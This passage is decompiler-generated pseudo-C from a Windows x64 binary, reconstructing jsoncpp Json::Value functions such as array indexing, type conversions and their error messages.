    LODWORD(v4) = (_DWORD)a2;
  else
    v4 = (_QWORD *)*a2;
  v5 = a2[2];
  if ( v2 >= 0x10 )
    a2 = (_QWORD *)*a2;
  return sub_14006EB90(v3, a2, (signed int)v5 + (signed int)v4);
}

//----- (000000014006C0F0) ----------------------------------------------------
signed __int64 __fastcall sub_14006C0F0(__int64 a1, signed int a2)
{
  _QWORD *v2; // rax
  __int64 v4; // [rsp+28h] [rbp-130h]
  signed int *v5; // [rsp+30h] [rbp-128h]
  char v6; // [rsp+38h] [rbp-120h]
  void *v7; // [rsp+B8h] [rbp-A0h]
  char v8; // [rsp+120h] [rbp-38h]

  v4 = -2i64;
  if ( a2 < 0 )
  {
    v5 = (signed int *)&unk_1400AE528;
    v7 = std::basic_ios<char,std::char_traits<char>>::`vftable';
    std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(&v5, &v6, 0i64, 0i64);
    *(signed int **)((char *)&v5 + v5[1]) = (signed int *)&off_1400AE520;
    *(_DWORD *)((char *)&v4 + v5[1] + 4) = v5[1] - 136;
    sub_140022FE0((__int64)&v6, 2);
    sub_14006AC80(&v5, "in Json::Value::operator[](int index): index cannot be negative");
    v2 = sub_14006F1C0((__int64)&v5, &v8);
    sub_14006F240(v2);
  }
  return sub_14006C1E0(a1, a2);
}
// 14006AC80: using guessed type __int64 __fastcall sub_14006AC80(_QWORD, _QWORD);
// 1400A1638: using guessed type void *std::basic_ios<char,std::char_traits<char>>::`vftable';
// 1400AE520: using guessed type __int64 (__fastcall *off_1400AE520)();

//----- (000000014006C1E0) ----------------------------------------------------
signed __int64 __fastcall sub_14006C1E0(__int64 a1, unsigned int a2)
{
  unsigned int v2; // er15
  void ****v3; // r12
  char v4; // al
  _QWORD *v5; // rax
  _QWORD *v6; // rax
  _QWORD *v7; // rbx
  __int64 v8; // rax
  void ***v9; // r13
  void **v10; // r14
  __int64 *v11; // rbx
  const void *v12; // rcx
  bool v13; // cf
  unsigned int v14; // edi
  int *v15; // rax
  int v16; // eax
  const void *v17; // rcx
  bool v18; // zf
  unsigned int v19; // edx
  void ***v21; // rbx
  _QWORD *v22; // rax
  __int64 v23; // rbx
  unsigned int v24; // [rsp+30h] [rbp-A8h]
  int v25[2]; // [rsp+38h] [rbp-A0h]
  void *Memory; // [rsp+40h] [rbp-98h]
  unsigned int v27; // [rsp+48h] [rbp-90h]
  char v28; // [rsp+50h] [rbp-88h]
  __int64 v29; // [rsp+68h] [rbp-70h]
  signed int *v30; // [rsp+70h] [rbp-68h]
  char v31; // [rsp+78h] [rbp-60h]
  char v32; // [rsp+D0h] [rbp-8h]
  _QWORD *v33; // [rsp+138h] [rbp+60h]
  unsigned int v34; // [rsp+140h] [rbp+68h]
  __int64 v35; // [rsp+148h] [rbp+70h]

  v29 = -2i64;
  v2 = a2;
  v3 = (void ****)a1;
  v24 = 0;
  v4 = *(_BYTE *)(a1 + 8);
  if ( !v4 )
    goto LABEL_34;
  if ( v4 != 6 )
  {
    v30 = (signed int *)&unk_1400AE528;
    std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(&v32);
    v24 = 1;
    std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(&v30, &v31, 0i64, 0i64);
    *(signed int **)((char *)&v30 + v30[1]) = (signed int *)&off_1400AE520;
    *(_DWORD *)((char *)&v29 + v30[1] + 4) = v30[1] - 136;
    sub_140022FE0((__int64)&v31, 2);
    sub_14006AC80(&v30, "in Json::Value::operator[](ArrayIndex): requires arrayValue");
    v5 = sub_14006F1C0((__int64)&v30, &v33);
    sub_14006F240(v5);
  }
  if ( !v4 )
  {
LABEL_34:
    v34 = v34 & 0xFFFFFE06 | 6;
    v35 = 0i64;
    v6 = operator new(0x10ui64);
    v7 = v6;
    *(_QWORD *)v25 = v6;
    if ( v6 )
    {
      *v6 = 0i64;
      v6[1] = 0i64;
      sub_14006C9C0();
      *v7 = v8;
    }
    else
    {
      v7 = 0i64;
    }
    v33 = v7;
    sub_14006BFB0((__int64)v3);
    sub_14006BF10((__int64)&v33);
  }
  v33 = 0i64;
  v34 = v2;
  v9 = *v3;
  v10 = **v3;
  v11 = (__int64 *)v10[1];
  if ( !*((_BYTE *)v11 + 25) )
  {
    while ( 1 )
    {
      v12 = (const void *)v11[4];
      if ( !v12 )
        break;
      v14 = *((_DWORD *)v11 + 10) >> 2;
      v25[0] = v14;
      v24 = v2 >> 2;
      v15 = (int *)&v24;
      if ( v2 >> 2 >= v14 )
        v15 = v25;
      v16 = memcmp(v12, 0i64, (unsigned int)*v15);
      if ( v16 < 0 )
      {
LABEL_19:
        v11 = (__int64 *)v11[2];
        goto LABEL_20;
      }
      if ( v16 <= 0 )
      {
        v13 = v14 < v2 >> 2;
LABEL_17:
        if ( v13 )
          goto LABEL_19;
      }
      v10 = (void **)v11;
      v11 = (__int64 *)*v11;
LABEL_20:
      if ( *((_BYTE *)v11 + 25) )
        goto LABEL_21;
    }
    v13 = *((_DWORD *)v11 + 10) < v2;
    goto LABEL_17;
  }
LABEL_21:
  if ( v10 == *v9 )
    goto LABEL_28;
  v17 = v10[4];
  if ( v17 )
  {
    v19 = *((_DWORD *)v10 + 10) >> 2;
    if ( v19 != v2 >> 2 )
      goto LABEL_28;
    v18 = memcmp(v17, 0i64, v19) == 0;
  }
  else
  {
    v18 = *((_DWORD *)v10 + 10) == v2;
  }
  if ( v18 )
    return (signed __int64)(v10 + 6);
LABEL_28:
  Memory = 0i64;
  v27 = v2 ^ ((unsigned __int8)v2 ^ v2 & 3) & 3;
  sub_14006BAD0(&v28);
  v21 = *v3;
  v22 = sub_14006AE50(*v3, (__int64)&Memory);
  sub_14006B2E0(v25, v21, v10, (__int64)(v22 + 4), (__int64)v22);
  v23 = *(_QWORD *)v25;
  sub_14006BF10((__int64)&v28);
  if ( Memory )
  {
    if ( (v27 & 3) == 1 )
      free(Memory);
  }
  return v23 + 48;
}
// 14006AC80: using guessed type __int64 __fastcall sub_14006AC80(_QWORD, _QWORD);
// 14006BAD0: using guessed type __int64 __fastcall sub_14006BAD0(_QWORD);
// 1400A14F8: using guessed type __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(_QWORD);
// 1400AE520: using guessed type __int64 (__fastcall *off_1400AE520)();
// 1400DBD78: using guessed type __int64 qword_1400DBD78;

//----- (000000014006C4B0) ----------------------------------------------------
signed __int64 __fastcall sub_14006C4B0(__int64 a1, _QWORD *a2)
{
  signed __int64 v2; // r8

  v2 = -1i64;
  do
    ++v2;
  while ( *((_BYTE *)a2 + v2) );
  return sub_14006EB90(a1, a2, (signed int)a2 + (signed int)v2);
}

//----- (000000014006C4D0) ----------------------------------------------------
__int64 __fastcall sub_14006C4D0(__int64 a1, _QWORD *a2)
{
  unsigned __int64 v2; // rax
  __int64 v3; // r9
  _QWORD *v4; // r8
  __int64 v5; // rcx
  __int64 result; // rax

  v2 = a2[3];
  v3 = a1;
  if ( v2 < 0x10 )
    LODWORD(v4) = (_DWORD)a2;
  else
    v4 = (_QWORD *)*a2;
  v5 = a2[2];
  if ( v2 >= 0x10 )
    a2 = (_QWORD *)*a2;
  result = sub_14006E230(v3, a2, (signed int)v5 + (signed int)v4);
  if ( !result )
    result = qword_1400DBD78;
  return result;
}
// 1400DBD78: using guessed type __int64 qword_1400DBD78;

//----- (000000014006C520) ----------------------------------------------------
__int64 __fastcall sub_14006C520(_QWORD **a1, signed int a2)
{
  _QWORD *v2; // rax
  __int64 v4; // [rsp+28h] [rbp-130h]
  signed int *v5; // [rsp+30h] [rbp-128h]
  char v6; // [rsp+38h] [rbp-120h]
  void *v7; // [rsp+B8h] [rbp-A0h]
  char v8; // [rsp+120h] [rbp-38h]

  v4 = -2i64;
  if ( a2 < 0 )
  {
    v5 = (signed int *)&unk_1400AE528;
    v7 = std::basic_ios<char,std::char_traits<char>>::`vftable';
    std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(&v5, &v6, 0i64, 0i64);
    *(signed int **)((char *)&v5 + v5[1]) = (signed int *)&off_1400AE520;
    *(_DWORD *)((char *)&v4 + v5[1] + 4) = v5[1] - 136;
    sub_140022FE0((__int64)&v6, 2);
    sub_14006AC80(&v5, "in Json::Value::operator[](int index) const: index cannot be negative");
    v2 = sub_14006F1C0((__int64)&v5, &v8);
    sub_14006F240(v2);
  }
  return sub_14006C610(a1, a2);
}
// 14006AC80: using guessed type __int64 __fastcall sub_14006AC80(_QWORD, _QWORD);
// 1400A1638: using guessed type void *std::basic_ios<char,std::char_traits<char>>::`vftable';
// 1400AE520: using guessed type __int64 (__fastcall *off_1400AE520)();

//----- (000000014006C610) ----------------------------------------------------
__int64 __fastcall sub_14006C610(_QWORD **a1, unsigned int a2)
{
  unsigned int v2; // er15
  char v3; // al
  _QWORD *v4; // rax
  __int64 v5; // rbx
  __int64 v6; // rdi
  __int64 v7; // r14
  const void *v8; // rcx
  bool v9; // cf
  unsigned int v10; // esi
  __int64 *v11; // rax
  int v12; // eax
  bool v13; // zf
  __int64 result; // rax
  unsigned int v15; // [rsp+20h] [rbp-168h]
  __int64 v16; // [rsp+28h] [rbp-160h]
  __int64 v17; // [rsp+30h] [rbp-158h]
  int v18; // [rsp+3Ch] [rbp-14Ch]
  signed int *v19; // [rsp+40h] [rbp-148h]
  char v20; // [rsp+48h] [rbp-140h]
  void *v21; // [rsp+C8h] [rbp-C0h]
  char v22; // [rsp+130h] [rbp-58h]

  v17 = -2i64;
  v2 = a2;
  v15 = 0;
  v3 = *((_BYTE *)a1 + 8);
  if ( !v3 )
    goto LABEL_25;
  if ( v3 != 6 )
  {
    v19 = (signed int *)&unk_1400AE528;
    v21 = std::basic_ios<char,std::char_traits<char>>::`vftable';
    v15 = 1;
    std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(&v19, &v20, 0i64, 0i64);
    *(signed int **)((char *)&v19 + v19[1]) = (signed int *)&off_1400AE520;
    *(int *)((char *)&v18 + v19[1]) = v19[1] - 136;
    sub_140022FE0((__int64)&v20, 2);
    sub_14006AC80(&v19, "in Json::Value::operator[](ArrayIndex)const: requires arrayValue");
    v4 = sub_14006F1C0((__int64)&v19, &v22);
    sub_14006F240(v4);
  }
  if ( !v3 )
    goto LABEL_25;
  v5 = **a1;
  v6 = *(_QWORD *)(v5 + 8);
  v7 = **a1;
  if ( !*(_BYTE *)(v6 + 25) )
  {
    while ( 1 )
    {
      v8 = *(const void **)(v6 + 32);
      if ( !v8 )
        break;
      v10 = *(_DWORD *)(v6 + 40) >> 2;
      LODWORD(v16) = v10;
      v15 = v2 >> 2;
      v11 = (__int64 *)&v15;
      if ( v2 >> 2 >= v10 )
        v11 = &v16;
      v12 = memcmp(v8, 0i64, *(unsigned int *)v11);
      if ( v12 < 0 )
      {
LABEL_15:
        v6 = *(_QWORD *)(v6 + 16);
        goto LABEL_16;
      }
      if ( v12 <= 0 )
      {
        v9 = v10 < v2 >> 2;
LABEL_13:
        if ( v9 )
          goto LABEL_15;
      }
      v7 = v6;
      v6 = *(_QWORD *)v6;
LABEL_16:
      if ( *(_BYTE *)(v6 + 25) )
        goto LABEL_17;
    }
    v9 = *(_DWORD *)(v6 + 40) < v2;
    goto LABEL_13;
  }
LABEL_17:
  if ( v7 == v5 || (v13 = v2 >= *(_DWORD *)(v7 + 40), v16 = v7, !v13) )
    v16 = v5;
  if ( v16 != v5 )
    result = v16 + 48;
  else
LABEL_25:
    result = qword_1400DBD78;
  return result;
}
// 14006AC80: using guessed type __int64 __fastcall sub_14006AC80(_QWORD, _QWORD);
// 1400A1638: using guessed type void *std::basic_ios<char,std::char_traits<char>>::`vftable';
// 1400AE520: using guessed type __int64 (__fastcall *off_1400AE520)();
// 1400DBD78: using guessed type __int64 qword_1400DBD78;

//----- (000000014006C7F0) ----------------------------------------------------
char __fastcall sub_14006C7F0(__int64 a1, __int64 a2)
{
  const void *v2; // r9
  unsigned int v4; // edi
  const void *v5; // rdx
  unsigned int v6; // ebx
  unsigned int v7; // edi
  int *v8; // rax
  int v9; // eax
  unsigned int v10; // [rsp+30h] [rbp+8h]
  unsigned int v11; // [rsp+40h] [rbp+18h]

  v2 = *(const void **)a1;
  if ( !*(_QWORD *)a1 )
    return *(_DWORD *)(a1 + 8) < *(_DWORD *)(a2 + 8);
  v4 = *(_DWORD *)(a2 + 8);
  v5 = *(const void **)a2;
  v6 = *(_DWORD *)(a1 + 8) >> 2;
  v7 = v4 >> 2;
  v8 = (int *)&v10;
  v11 = v6;
  v10 = v7;
  if ( v7 >= v6 )
    v8 = (int *)&v11;
  v9 = memcmp(v2, v5, (unsigned int)*v8);
  if ( v9 < 0 )
    return 1;
  if ( v9 <= 0 )
    return v6 < v7;
  return 0;
}

//----- (000000014006C890) ----------------------------------------------------
void __fastcall sub_14006C890(__int64 a1)
{
  struct std::ios_base *v1; // rbx

  v1 = (struct std::ios_base *)(a1 + 136);
  *(_QWORD *)((char *)v1 + *(signed int *)(*(_QWORD *)a1 + 4i64) - 136) = &off_1400AE520;
  *(_DWORD *)((char *)v1 + *(signed int *)(*(_QWORD *)a1 + 4i64) - 140) = *(_DWORD *)(*(_QWORD *)a1 + 4i64) - 136;
  sub_140023CD0(a1 + 8);
  std::basic_ostream<char,std::char_traits<char>>::~basic_ostream<char,std::char_traits<char>>((char *)v1 - 120);
  *(_QWORD *)v1 = std::basic_ios<char,std::char_traits<char>>::`vftable';
  *(_QWORD *)v1 = std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(v1);
}
// 1400A14E8: using guessed type __int64 __fastcall std::basic_ostream<char,std::char_traits<char>>::~basic_ostream<char,std::char_traits<char>>(_QWORD);
// 1400A1638: using guessed type void *std::basic_ios<char,std::char_traits<char>>::`vftable';
// 1400A1640: using guessed type void *std::ios_base::`vftable';
// 1400A16C0: using guessed type void __stdcall static std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 1400AE520: using guessed type __int64 (__fastcall *off_1400AE520)();

//----- (000000014006C904) ----------------------------------------------------
void *__fastcall sub_14006C904(__int64 a1, char a2)
{
  return sub_14006C910(a1 - *(signed int *)(a1 - 4), a2);
}

//----- (000000014006C910) ----------------------------------------------------
void *__fastcall sub_14006C910(__int64 a1, char a2)
{
  void *v2; // rdi
  char v3; // bl

  v2 = (void *)(a1 - 136);
  v3 = a2;
  sub_14006C890(a1 - 136);
  if ( v3 & 1 )
    operator delete(v2);
  return v2;
}

//----- (000000014006C950) ----------------------------------------------------
_QWORD *__fastcall sub_14006C950(void *a1, char a2)
{
  char v2; // di
  _QWORD *v3; // rbx

  v2 = a2;
  v3 = a1;
  *(_QWORD *)a1 = &off_1400AE4C0;
  if ( *((_QWORD *)a1 + 6) >= 0x10ui64 )
    operator delete(*((void **)a1 + 3));
  v3[6] = 15i64;
  v3[5] = 0i64;
  *((_BYTE *)v3 + 24) = 0;
  std::exception::~exception((std::exception *)v3);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);
// 1400AE4C0: using guessed type __int64 (__fastcall *off_1400AE4C0)(void *);

//----- (000000014006C9C0) ----------------------------------------------------
void sub_14006C9C0()
{
  _QWORD *v0; // rax

  v0 = operator new(0x48ui64);
  if ( !v0 )
    std::_Xbad_alloc();
  *v0 = v0;
  if ( v0 != (_QWORD *)-8i64 )
    v0[1] = v0;
  if ( v0 != (_QWORD *)-16i64 )
    v0[2] = v0;
  *((_WORD *)v0 + 12) = 257;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014006CA10) ----------------------------------------------------
_QWORD *__fastcall sub_14006CA10(_QWORD *a1)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rdx

  v1 = a1;
  v2 = operator new(0x48ui64);
  if ( !v2 )
    std::_Xbad_alloc();
  *v2 = *v1;
  if ( v2 != (_QWORD *)-8i64 )
    v2[1] = *v1;
  if ( v2 != (_QWORD *)-16i64 )
    v2[2] = *v1;
  return v2;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014006CA70) ----------------------------------------------------
void __fastcall sub_14006CA70(__int64 a1, char *a2)
{
  void *v2; // rdi
  signed __int64 v3; // rbx

  v2 = a2;
  v3 = (signed __int64)(a2 + 32);
  sub_14006BF10((__int64)(a2 + 48));
  if ( *(_QWORD *)v3 && (*(_DWORD *)(v3 + 8) & 3) == 1 )
    free(*(void **)v3);
  operator delete(v2);
}

//----- (000000014006CAD0) ----------------------------------------------------
void __fastcall sub_14006CAD0(__int64 a1, __int64 *a2)
{
  __int64 *v2; // rsi
  __int64 v3; // rbp
  __int64 *i; // rbx
  void *v5; // rcx

  v2 = a2;
  v3 = a1;
  for ( i = a2; !*((_BYTE *)i + 25); v2 = i )
  {
    sub_14006CAD0(v3, (__int64 *)i[2]);
    i = (__int64 *)*i;
    sub_14006BF10((__int64)(v2 + 6));
    v5 = (void *)v2[4];
    if ( v5 )
    {
      if ( (v2[5] & 3) == 1 )
        free(v5);
    }
    operator delete(v2);
  }
}

//----- (000000014006CB60) ----------------------------------------------------
void __fastcall sub_14006CB60(void **a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rdi
  void **v3; // r15
  _QWORD *v4; // rsi
  void **v5; // r12
  void **v6; // rbx
  signed __int64 v7; // r14
  char v8; // [rsp+78h] [rbp+10h]
  _QWORD *v9; // [rsp+80h] [rbp+18h]

  v2 = a2;
  v3 = a1;
  v4 = 0i64;
  v9 = 0i64;
  if ( a2 )
  {
    if ( a2 > 0x7FFFFFFFFFFFFFFi64 || (v4 = operator new(32 * a2), (v9 = v4) == 0i64) )
      std::_Xbad_alloc();
  }
  sub_14006B750(*v3, v3[1], v4, (__int64)&v8);
  v5 = (void **)v3[1];
  v6 = (void **)*v3;
  v7 = (_BYTE *)v3[1] - (_BYTE *)*v3;
  if ( *v3 )
  {
    for ( ; v6 != v5; v6 += 4 )
    {
      if ( (unsigned __int64)v6[3] >= 0x10 )
        operator delete(*v6);
      v6[3] = (void *)15;
      v6[2] = 0i64;
      *(_BYTE *)v6 = 0;
    }
    operator delete(*v3);
  }
  v3[2] = &v4[4 * v2];
  v3[1] = (char *)v4 + (v7 & 0xFFFFFFFFFFFFFFE0ui64);
  *v3 = v4;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014006CC80) ----------------------------------------------------
void __fastcall sub_14006CC80(__int64 a1, unsigned __int64 a2)
{
  __int64 v2; // r8
  unsigned __int64 v3; // r9
  __int64 v4; // rdx
  signed __int64 v5; // r10
  __int64 v6; // r8
  unsigned __int64 v7; // r11
  unsigned __int64 v8; // rdx
  unsigned __int64 v9; // rdx
  unsigned __int64 v10; // rdx

  v2 = *(_QWORD *)(a1 + 8);
  v3 = a2;
  v4 = *(_QWORD *)(a1 + 16);
  if ( (*(_QWORD *)(a1 + 16) - v2) >> 5 < v3 )
  {
    v5 = 0x7FFFFFFFFFFFFFFi64;
    v6 = (v2 - *(_QWORD *)a1) >> 5;
    if ( 0x7FFFFFFFFFFFFFFi64 - v6 < v3 )
    {
      std::_Xlength_error("vector<T> too long");
      __debugbreak();
    }
    v7 = v6 + v3;
    v8 = (v4 - *(_QWORD *)a1) >> 5;
    if ( v5 - (v8 >> 1) >= v8 )
    {
      v10 = (v8 >> 1) + v8;
      if ( v10 < v7 )
        v10 = v6 + v3;
      sub_14006CB60((void **)a1, v10);
    }
    else
    {
      v9 = 0i64;
      if ( v7 > 0 )
        v9 = v6 + v3;
      sub_14006CB60((void **)a1, v9);
    }
  }
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014006CD10) ----------------------------------------------------
void __fastcall sub_14006CD10(void **a1)
{
  void **v1; // rbx
  void **v2; // rdi
  void **i; // rsi

  v1 = (void **)*a1;
  v2 = a1;
  if ( *a1 )
  {
    for ( i = (void **)a1[1]; v1 != i; v1 += 4 )
    {
      if ( (unsigned __int64)v1[3] >= 0x10 )
        operator delete(*v1);
      v1[3] = (void *)15;
      v1[2] = 0i64;
      *(_BYTE *)v1 = 0;
    }
    operator delete(*v2);
    *v2 = 0i64;
    v2[1] = 0i64;
    v2[2] = 0i64;
  }
}

//----- (000000014006CD90) ----------------------------------------------------
char __fastcall sub_14006CD90(_BYTE *a1)
{
  _QWORD *v1; // rax
  __int64 v3; // [rsp+28h] [rbp-130h]
  signed int *v4; // [rsp+30h] [rbp-128h]
  char v5; // [rsp+38h] [rbp-120h]
  void *v6; // [rsp+B8h] [rbp-A0h]
  char v7; // [rsp+120h] [rbp-38h]

  v3 = -2i64;
  switch ( a1[8] )
  {
    case 0:
      return 0;
    case 1:
    case 2:
      return *(_QWORD *)a1 != 0i64;
    case 3:
      return *(double *)a1 != 0.0;
  }
  if ( a1[8] != 5 )
  {
    v4 = (signed int *)&unk_1400AE528;
    v6 = std::basic_ios<char,std::char_traits<char>>::`vftable';
    std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(&v4, &v5, 0i64, 0i64);
    *(signed int **)((char *)&v4 + v4[1]) = (signed int *)&off_1400AE520;
    *(_DWORD *)((char *)&v3 + v4[1] + 4) = v4[1] - 136;
    sub_140022FE0((__int64)&v5, 2);
    sub_14006AC80(&v4, "Value is not convertible to bool.");
    v1 = sub_14006F1C0((__int64)&v4, &v7);
    sub_14006F240(v1);
  }
  return *a1;
}
// 14006AC80: using guessed type __int64 __fastcall sub_14006AC80(_QWORD, _QWORD);
// 1400A1638: using guessed type void *std::basic_ios<char,std::char_traits<char>>::`vftable';
// 1400AE520: using guessed type __int64 (__fastcall *off_1400AE520)();

//----- (000000014006CED0) ----------------------------------------------------
double __fastcall sub_14006CED0(_BYTE *a1)
{
  _QWORD *v1; // rax
  double result; // xmm0_8
  __int64 v3; // [rsp+28h] [rbp-130h]
  signed int *v4; // [rsp+30h] [rbp-128h]
  char v5; // [rsp+38h] [rbp-120h]
  void *v6; // [rsp+B8h] [rbp-A0h]
  char v7; // [rsp+120h] [rbp-38h]

  v3 = -2i64;
  if ( !a1[8] )
    return 0.0;
  if ( a1[8] == 1 )
    return (double)(signed int)*(_QWORD *)a1;
  if ( a1[8] != 2 )
  {
    if ( a1[8] == 3 )
      return *(double *)a1;
    if ( a1[8] != 5 )
    {
      v4 = (signed int *)&unk_1400AE528;
      v6 = std::basic_ios<char,std::char_traits<char>>::`vftable';
      std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(&v4, &v5, 0i64, 0i64);
      *(signed int **)((char *)&v4 + v4[1]) = (signed int *)&off_1400AE520;
      *(_DWORD *)((char *)&v3 + v4[1] + 4) = v4[1] - 136;
      sub_140022FE0((__int64)&v5, 2);
      sub_14006AC80(&v4, "Value is not convertible to double.");
      v1 = sub_14006F1C0((__int64)&v4, &v7);
      sub_14006F240(v1);
    }
    if ( *a1 )
      return 1.0;
    return 0.0;
  }
  result = (double)(signed int)*(_QWORD *)a1;
  if ( *(_QWORD *)a1 < 0 )
    result = result + 1.844674407370955e19;
  return result;
}
// 14006AC80: using guessed type __int64 __fastcall sub_14006AC80(_QWORD, _QWORD);
// 1400A1638: using guessed type void *std::basic_ios<char,std::char_traits<char>>::`vftable';
// 1400AE520: using guessed type __int64 (__fastcall *off_1400AE520)();

//----- (000000014006D020) ----------------------------------------------------
double __usercall sub_14006D020@<rax>(__int64 a1@<rcx>)
{
  __int64 v1; // rbx
  double v2; // rdx
  int v3; // ecx
  int v4; // ecx
  int v5; // ecx
  int v6; // ecx
  _QWORD *v7; // rax
  double result; // rax
  double v9; // xmm1_8
  _QWORD *v10; // rax
  _QWORD *v11; // rax
  int v12; // [rsp+2Ch] [rbp-D4h]
  signed int *v13; // [rsp+30h] [rbp-D0h]
  char v14; // [rsp+38h] [rbp-C8h]
  void *v15; // [rsp+B8h] [rbp-48h]
  __int64 v16; // [rsp+120h] [rbp+20h]
  char v17; // [rsp+128h] [rbp+28h]
  char v18; // [rsp+148h] [rbp+48h]

  v16 = -2i64;
  v1 = a1;
  v2 = 0.0;
  v3 = *(char *)(a1 + 8);
  if ( !v3 )
    return 0.0;
  v4 = v3 - 1;
  if ( !v4 )
    return *(double *)v1;
  v5 = v4 - 1;
  if ( !v5 )
  {
LABEL_12:
    if ( !sub_14006E820(v1) )
    {
      v13 = (signed int *)&unk_1400AE528;
      v15 = std::basic_ios<char,std::char_traits<char>>::`vftable';
      std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(
        &v13,
        &v14,
        0i64,
        0i64);
      *(signed int **)((char *)&v13 + v13[1]) = (signed int *)&off_1400AE520;
      *(int *)((char *)&v12 + v13[1]) = v13[1] - 136;
      sub_140022FE0((__int64)&v14, 2);
      sub_14006AC80(&v13, "LargestUInt out of Int64 range");
      v11 = sub_14006F1C0((__int64)&v13, &v18);
      sub_14006F240(v11);
    }
    return *(double *)v1;
  }
  v6 = v5 - 1;
  if ( !v6 )
  {
    v9 = *(double *)v1;
    if ( *(double *)v1 >= (double)0 && (double)-1 >= v9 )
    {
      *(_QWORD *)&result = (unsigned int)(signed int)v9;
      return result;
    }
    v13 = (signed int *)&unk_1400AE528;
    std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(&v15);
    std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(&v13, &v14, 0i64, 0i64);
    *(signed int **)((char *)&v13 + v13[1]) = (signed int *)&off_1400AE520;
    *(int *)((char *)&v12 + v13[1]) = v13[1] - 136;
    sub_140022FE0((__int64)&v14, 2);
    sub_14006AC80(&v13, "double out of Int64 range");
    v10 = sub_14006F1C0((__int64)&v13, &v17);
    sub_14006F240(v10);
    goto LABEL_12;
  }
  if ( v6 != 2 )
  {
    v13 = (signed int *)&unk_1400AE528;
    std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(&v15);
    std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(&v13, &v14, 0i64, 0i64);
    *(signed int **)((char *)&v13 + v13[1]) = (signed int *)&off_1400AE520;
    *(int *)((char *)&v12 + v13[1]) = v13[1] - 136;
    sub_140022FE0((__int64)&v14, 2);
    sub_14006AC80(&v13, "Value is not convertible to Int64.");
    v7 = sub_14006F1C0((__int64)&v13, &v17);
    sub_14006F240(v7);
  }
  LOBYTE(v2) = *(_BYTE *)v1 != LOBYTE(v2);
  return v2;
}
// 14006AC80: using guessed type __int64 __fastcall sub_14006AC80(_QWORD, _QWORD);
// 1400A14F8: using guessed type __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(_QWORD);
// 1400A1638: using guessed type void *std::basic_ios<char,std::char_traits<char>>::`vftable';
// 1400AE520: using guessed type __int64 (__fastcall *off_1400AE520)();

//----- (000000014006D2F0) ----------------------------------------------------
_QWORD *__fastcall sub_14006D2F0(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx
  size_t v3; // r8
  char *v4; // rdx
  signed __int64 v5; // rax
  char *v6; // rdx
  _QWORD *v7; // rax
  __int64 v9; // [rsp+28h] [rbp-130h]
  signed int *v10; // [rsp+30h] [rbp-128h]
  char v11; // [rsp+38h] [rbp-120h]
  char v12; // [rsp+B8h] [rbp-A0h]
  char v13; // [rsp+120h] [rbp-38h]

  v9 = -2i64;
  v2 = a2;
  switch ( *(char *)(a1 + 8) )
  {
    case 0:
      goto LABEL_2;
    case 1:
      sub_140073060(a2, *(_QWORD *)a1);
      return v2;
    case 2:
      sub_1400731B0(a2, *(_QWORD *)a1);
      return v2;
    case 3:
      sub_140072EB0(a2, *(double *)a1);
      return v2;
    case 4:
      v4 = *(char **)a1;
      if ( *(_QWORD *)a1 )
      {
        if ( (*(_WORD *)(a1 + 8) >> 8) & 1 )
        {
          LODWORD(v5) = *(_DWORD *)v4;
          v4 += 4;
        }
        else
        {
          v5 = -1i64;
          do
            ++v5;
          while ( v4[v5] );
        }
        v3 = (unsigned int)v5;
        v2[3] = 15i64;
        v2[2] = 0i64;
        *(_BYTE *)v2 = 0;
      }
      else
      {
LABEL_2:
        v2[3] = 15i64;
        v2[2] = 0i64;
        *(_BYTE *)v2 = 0;
        v3 = 0i64;
        v4 = byte_1400A3400;
      }
      goto LABEL_17;
    case 5:
      v6 = "false";
      if ( *(_BYTE *)a1 )
        v6 = "true";
      sub_140003D30(v2, v6);
      break;
    default:
      v10 = (signed int *)&unk_1400AE528;
      std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(&v12);
      std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(
        &v10,
        &v11,
        0i64,
        0i64);
      *(signed int **)((char *)&v10 + v10[1]) = (signed int *)&off_1400AE520;
      *(_DWORD *)((char *)&v9 + v10[1] + 4) = v10[1] - 136;
      sub_140022FE0((__int64)&v11, 2);
      sub_14006AC80(&v10, "Type is not convertible to string");
      v7 = sub_14006F1C0((__int64)&v10, &v13);
      sub_14006F240(v7);
LABEL_17:
      sub_140004F20(v2, v4, v3);
      break;
  }
  return v2;
}
// 14006AC80: using guessed type __int64 __fastcall sub_14006AC80(_QWORD, _QWORD);
// 1400A14F8: using guessed type __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(_QWORD);
// 1400AE520: using guessed type __int64 (__fastcall *off_1400AE520)();

//----- (000000014006D4E0) ----------------------------------------------------
double __usercall sub_14006D4E0@<rax>(__int64 a1@<rcx>)
{
  __int64 v1; // rbx
  double v2; // rdx
  int v3; // ecx
  int v4; // ecx
  int v5; // ecx
